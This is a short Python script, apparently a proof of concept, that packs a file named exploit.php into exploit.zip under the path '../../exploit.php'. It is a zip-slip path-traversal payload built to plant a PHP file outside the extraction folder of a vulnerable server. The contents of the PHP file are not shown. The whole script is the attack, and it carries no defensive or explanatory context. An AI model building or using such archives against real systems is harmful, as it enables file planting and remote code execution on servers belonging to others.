import zipfile


with zipfile.ZipFile("exploit.zip", "w") as archive:
    archive.write("exploit.php", "../../exploit.php")
